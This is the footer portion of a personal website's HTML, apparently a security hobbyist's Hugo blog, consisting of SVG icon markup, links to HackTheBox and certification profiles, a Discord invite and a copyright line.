.334-.0368.4605-.11a.8974.8974 0 00.3086-.2964c.0793-.1237.1372-.2673.1729-.4312a2.3737 2.3737 0 00.0543-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0936-.3046-.1729-.4261a.9011.9011 0 00-.3086-.2909c-.1265-.072-.2798-.1078-.4605-.1078zm-8.5372.0682l-.8407.6175.3141.4294.4762-.3678v1.8773h.603v-2.5564zm6.4863 0l-.8413.6175.3146.4294.4762-.3678v1.8773h.6031v-2.5564zm-4.4355.4442c.0797 0 .1438.0284.1932.0848.0493.0564.0874.1263.114.2093a1.312 1.312 0 01.0542.2691 2.803 2.803 0 01.014.2637c0 .0818-.0048.1712-.014.2689a1.3044 1.3044 0 01-.0543.2707c-.0265.083-.0646.1529-.1139.2093-.0494.0569-.1135.0852-.1932.0852-.0792 0-.1443-.0283-.1947-.0852-.051-.0564-.09-.1263-.1178-.2093a1.244 1.244 0 01-.0557-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.249 1.249 0 01.0557-.269c.0278-.0831.0668-.153.1178-.2094.0504-.0564.1155-.0848.1947-.0848zm6.4864 0c.0793 0 .1436.0284.193.0848.0493.0564.0874.1263.114.2093.0266.083.0444.1732.0543.2691.0092.0966.014.1844.014.2637a2.91 2.91 0 01-.014.2689 1.3176 1.3176 0 01-.0543.2707c-.0266.083-.0647.1529-.114.2093-.0494.0569-.1137.0852-.193.0852-.0791 0-.1444-.0283-.1948-.0852-.051-.0564-.09-.1263-.1176-.2093a1.2445 1.2445 0 01-.056-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.2484 1.2484 0 01.056-.269c.0276-.0831.0666-.153.1176-.2094.0504-.0564.1157-.0848.1948-.0848zm-2.1915 3.5112c-.1806 0-.3347.0364-.4621.108a.9076.9076 0 00-.3125.2913c-.0808.1215-.1387.263-.1751.4257a2.3826 2.3826 0 00-.0541.5143c0 .1806.0183.3525.0541.5164.0364.1639.0943.3075.1751.4316a.9092.9092 0 00.3125.2956c.1274.0738.2815.1102.4621.1102.1807 0 .3336-.0364.46-.1102a.8922.8922 0 00.3087-.2956c.0797-.124.1371-.2677.1735-.4316a2.3755 2.3755 0 00.0543-.5164c0-.1801-.018-.352-.0543-.5143-.0364-.1627-.0938-.3042-.1735-.4257a.8904.8904 0 00-.3088-.2913c-.1263-.0716-.2792-.108-.4599-.108zm-6.4016.0684l-.8413.6177.3143.4296.4765-.3684v1.8775h.6033v-2.5564zm2.1252 0l-.8413.6177.314.4296.4768-.3684v1.8775h.6033v-2.5564zm2.116 0l-.8407.6177.3135.4296.4768-.3684v1.8775h.603v-2.5564zm2.1604.4442c.0792 0 .1438.028.1932.085.0493.0565.0874.1265.114.2095.026.083.0444.1725.0537.2691.0097.096.0146.1839.0146.263 0 .082-.0049.1715-.0146.2691a1.3243 1.3243 0 01-.0537.2706c-.0266.083-.0647.153-.114.2095-.0494.0569-.114.085-.1932.085-.0797 0-.1441-.0281-.195-.085-.0506-.0565-.0898-.1265-.1174-.2095a1.2443 1.2443 0 01-.0558-.2706 2.6765 2.6765 0 01-.0146-.269c0-.0792.0048-.1671.0146-.263a1.2413 1.2413 0 01.0558-.2692c.0276-.083.0668-.153.1173-.2095.051-.057.1154-.085.1951-.085zm-6.7291 3.0723c-.1312 0-.243.0264-.3358.0785a.6615.6615 0 00-.2268.2111c-.0586.0885-.1009.1914-.127.3096a1.6979 1.6979 0 00-.0394.3732c0 .1313.013.2562.0394.375.0261.1188.0684.2235.127.313a.6535.6535 0 00.2268.2152c.0927.0532.2046.0797.3358.0797.1307 0 .2424-.0265.334-.0797a.6501.6501 0 00.2241-.2152c.0575-.0895.0996-.1942.1258-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0262-.1182-.0683-.2211-.1258-.3096a.658.658 0 00-.2241-.2111c-.0916-.0521-.2033-.0785-.334-.0785zm3.0859 0c-.1314 0-.243.0264-.3358.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.101.1914-.127.3096a1.6895 1.6895 0 00-.0394.3732c0 .1313.0128.2562.0394.375.026.1188.0684.2235.127.313a.6532.6532 0 00.2268.2152c.0927.0532.2044.0797.3358.0797.1307 0 .2423-.0265.334-.0797a.6496.6496 0 00.224-.2152c.0574-.0895.0993-.1942.1258-.313a1.7415 1.7415 0 00.039-.375 1.724 1.724 0 00-.039-.3732c-.0265-.1182-.0684-.2211-.1259-.3096a.6575.6575 0 00-.224-.2111c-.0916-.0521-.2032-.0785-.334-.0785zm5.1077 0c-.1312 0-.2428.0264-.3356.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.1008.1914-.127.3096a1.6977 1.6977 0 00-.0396.3732c0 .1313.0132.2562.0397.375.0261.1188.0683.2235.127.313a.6532.6532 0 00.2267.2152c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6496.6496 0 00.224-.2152c.0575-.0895.0992-.1942.1259-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0267-.1182-.0684-.2211-.126-.3096a.6575.6575 0 00-.2239-.2111c-.0916-.0521-.2035-.0785-.3342-.0785zm-6.658.0498l-.611.4487.2279.3112.3462-.2669v1.3627h.4375v-1.8557zm3.0677 0l-.6106.4487.2282.3112.3462-.2669v1.3627h.4377v-1.8557zm5.1082 0l-.6109.4487.2285.3112.346-.2669v1.3627h.4377v-1.8557zm-9.7115.3228c.0575 0 .1041.0205.14.0612.0358.0412.0633.0917.0823.152a.9604.9604 0 01.0397.1952c.007.07.0102.134.0102.1915 0 .0597-.0031.1247-.0102.1952a.954.954 0 01-.0397.197c-.019.0602-.0465.1107-.0824.1519-.0358.0412-.0824.0612-.1399.0612-.058 0-.1053-.02-.1416-.0612-.037-.0412-.065-.0917-.0852-.152a.8863.8863 0 01-.0407-.1969 1.9609 1.9609 0 01-.0108-.1952c0-.0575.0037-.1215.0108-.1915a.893.893 0 01.0407-.1952c.0202-.0603.0483-.1108.0852-.152.0363-.0407.0836-.0612.1416-.0612zm3.0859 0c.0575 0 .1041.0205.14.0612a.421.421 0 01.0821.152.9392.9392 0 01.0397.1952c.007.07.0103.134.0103.1915 0 .0597-.0033.1247-.0103.1952a.9302.9302 0 01-.0397.197.4211.4211 0 01-.0822.1519c-.0358.0412-.0824.0612-.14.0612-.058 0-.1053-.02-.1417-.0612a.4192.4192 0 01-.085-.152.8458.8458 0 01-.0407-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.004-.1215.011-.1915a.8487.8487 0 01.0407-.1952.4196.4196 0 01.085-.152c.0364-.0407.0837-.0612.1418-.0612zm5.1077 0c.0575 0 .1044.0205.1402.0612a.421.421 0 01.0822.152.9483.9483 0 01.0398.1952c.007.07.0102.134.0102.1915 0 .0597-.0032.1247-.0102.1952a.9427.9427 0 01-.0398.197.421.421 0 01-.0822.1519c-.0358.0412-.0827.0612-.1402.0612-.058 0-.1051-.02-.1415-.0612-.0368-.0412-.065-.0917-.0857-.152a.9503.9503 0 01-.04-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.0039-.1215.011-.1915a.9589.9589 0 01.04-.1952c.0207-.0603.0489-.1108.0857-.152.0363-.0407.0835-.0612.1415-.0612zm-1.6842 1.8138c-.1312 0-.2428.0266-.3356.0787a.659.659 0 00-.2268.211c-.0586.0883-.1008.1914-.127.3097a1.7304 1.7304 0 00-.0396.3733c0 .1312.0137.256.0397.3746.026.119.0683.2237.127.3137a.656.656 0 00.2267.2148c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6475.6475 0 00.224-.2148c.0576-.09.0998-.1948.1259-.3137.026-.1187.039-.2434.039-.3746 0-.1307-.013-.2557-.039-.3733-.0261-.1183-.0683-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2035-.0787-.3342-.0787zm3.0627 0c-.1313 0-.243.0266-.3358.0787a.6641.6641 0 00-.2268.211c-.0586.0883-.101.1914-.127.3097a1.7218 1.7218 0 00-.0394.3733c0 .1312.0134.256.0395.3746.026.119.0683.2237.1269.3137a.6609.6609 0 00.2268.2148c.0928.0532.2045.0797.3358.0797s.2424-.0265.334-.0797a.6475.6475 0 00.224-.2148c.0575-.09.1-.1948.1259-.3137a1.7398 1.7398 0 00.0396-.3746c0-.1307-.0135-.2557-.0396-.3733-.026-.1183-.0684-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2027-.0787-.334-.0787zm-1.5448.05l-.6109.448.2284.3124.346-.2675v1.3626h.4378v-1.8555zm-1.5179.3228c.0575 0 .1041.0206.14.0613a.4206.4206 0 01.0826.1517.9575.9575 0 01.0396.1953c.007.07.0102.134.0102.1916 0 .0597-.0032.1245-.0102.195a.9512.9512 0 01-.0396.197.4218.4218 0 01-.0826.1519c-.0359.0412-.0825.0612-.14.0612-.058 0-.1052-.02-.1415-.0612-.0368-.0412-.065-.0917-.085-.152a.9149.9149 0 01-.0408-.1969 1.9608 1.9608 0 01-.011-.195c0-.0575.004-.1217.011-.1916a.9232.9232 0 01.0407-.1953c.0202-.0603.0483-.1105.085-.1517.0364-.0407.0836-.0613.1416-.0613zm3.0627 0c.0575 0 .104.0206.1398.0613a.4208.4208 0 01.0826.1517.939.939 0 01.0394.1953c.0071.07.0104.134.0104.1916 0 .0597-.0033.1245-.0104.195a.9296.9296 0 01-.0394.197.4218.4218 0 01-.0826.1519c-.0357.0412-.0823.0612-.1398.0612-.0575 0-.1054-.02-.1417-.0612-.037-.0412-.065-.0917-.085-.152a.9065.9065 0 01-.0408-.1969 1.9495 1.9495 0 01-.0103-.195c0-.0575.0033-.1217.0103-.1916a.9145.9145 0 01.0407-.1953c.02-.0603.0481-.1105.085-.1517.0364-.0407.0843-.0613.1418-.0613zm-9.7123.1855c-.091 0-.1686.0182-.2326.0545a.4563.4563 0 00-.157.146c-.0408.0613-.0702.133-.0881.2149a1.1685 1.1685 0 00-.0271.2587c0 .0907.0086.1773.027.2598.018.082.0474.1546.0881.217a.4589.4589 0 00.157.1487c.064.037.1417.0557.2327.0557.0907 0 .1677-.0188.2311-.0557a.4504.4504 0 00.1558-.1487c.0402-.0624.0688-.135.0873-.217a1.2187 1.2187 0 00.0272-.2598c0-.0911-.0093-.1774-.0272-.2587-.0185-.082-.0471-.1536-.0873-.2148a.4479.4479 0 00-.1558-.146c-.0634-.0364-.1403-.0546-.231-.0546zm1.0519.0346l-.423.3102.1577.2166.2398-.185v.9442h.3037v-1.286zm-1.0519.2236c.0396 0 .0724.0141.0973.0429a.2841.2841 0 01.057.105.689.689 0 01.0276.1352c.0044.0489.007.0927.007.1328 0 .0407-.0027.0862-.007.135a.684.684 0 01-.0277.1362.2845.2845 0 01-.057.1053c-.0248.0288-.0576.043-.0972.043a.1247.1247 0 01-.098-.043.2976.2976 0 01-.0592-.1053.612.612 0 01-.0283-.1361 1.391 1.391 0 01-.0069-.135c0-.0402.0021-.084.007-.1329a.6197.6197 0 01.0282-.1353.2973.2973 0 01.0592-.105.1248.1248 0 01.098-.0428zm3.7749 1.394c-.0907 0-.1681.0178-.2321.0542a.4517.4517 0 00-.1574.1463c-.0407.0608-.07.1326-.088.2144a1.1691 1.1691 0 00-.0276.2587c0 .0905.0092.1774.0277.26.0179.0824.0472.1545.0879.2168a.4562.4562 0 00.1574.1493c.064.0368.1414.0547.232.0547.0912 0 .1683-.0179.2318-.0547a.451.451 0 00.1556-.1493.6636.6636 0 00.0868-.2169 1.1889 1.1889 0 00.0277-.26c0-.0906-.0092-.1773-.0277-.2586-.0179-.0818-.0473-.1536-.0868-.2144a.4461.4461 0 00-.1556-.1463c-.0635-.0364-.1406-.0543-.2317-.0543zm1.0522.034l-.423.3109.1578.2158.2398-.1849v.9444h.3033v-1.2861zm-1.0522.2236c.0401 0 .0726.014.0976.0427a.3008.3008 0 01.057.1054.6431.6431 0 01.027.135 1.31 1.31 0 01.0077.1329c0 .0412-.0027.0863-.0077.135a.655.655 0 01-.027.1367.3066.3066 0 01-.057.1054c-.025.0282-.0575.0421-.0976.0421-.0396 0-.0728-.0139-.0977-.042a.2928.2928 0 01-.0592-.1055.6182.6182 0 01-.028-.1366 1.3641 1.3641 0 01-.0077-.1351c0-.0401.0029-.0841.0077-.1328a.6122.6122 0 01.028-.135.2874.2874 0 01.0592-.1055c.0249-.0287.0581-.0427.0977-.0427z"/>
</svg>
</a>
<a href="https://app.hackthebox.com/profile/1068091" target="_blank" rel="noopener noreferrer me"
    title="HackTheBox">
    <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
    preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" fill="currentColor" stroke="none">
    <g>
        <path
            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
        </path>
    </g>
</svg>
</a>
<a href="https://verified.elearnsecurity.com/certificates/6da8bdbd-63c2-4fa6-8722-ab75a9668fcb" target="_blank" rel="noopener noreferrer me"
    title="EJPT">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
    <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
</svg>
</a>
<a href="https://discord.gg/VzKZZunue3" target="_blank" rel="noopener noreferrer me"
    title="Discord">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="20 15 205 190" fill="currentColor" stroke="none">
    <path
        d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zM140.9 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z" />
    <path
        d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z" />
</svg>
</a>
<a href="https://www.credly.com/badges/60a23b0a-1de8-4d77-9c8b-020de55ad2dc/public_url" target="_blank" rel="noopener noreferrer me"
    title="Security&#43;">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
    <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
</svg>
</a>
</div>
    <small class="footer_copyright">
        © 2025 Jon K.
        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noreferrer noopener">Hugo blog awesome</a>
        theme on
        <a href="https://gohugo.io" target="_blank" rel="noreferrer noopener">Hugo</a>.
    </small>
</footer><a href="#" title="Go to top" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    
    
    
    <script src="http://jon112358.com/js/script.min.46bd451490183d25f475c182f8fe773c1c787124cec75969e37c871d76aa151f.js" integrity="sha256-Rr1FFJAYPSX0dcGC&#43;P53PBx4cSTOx1lp43yHHXaqFR8="></script>

</body>
</html>
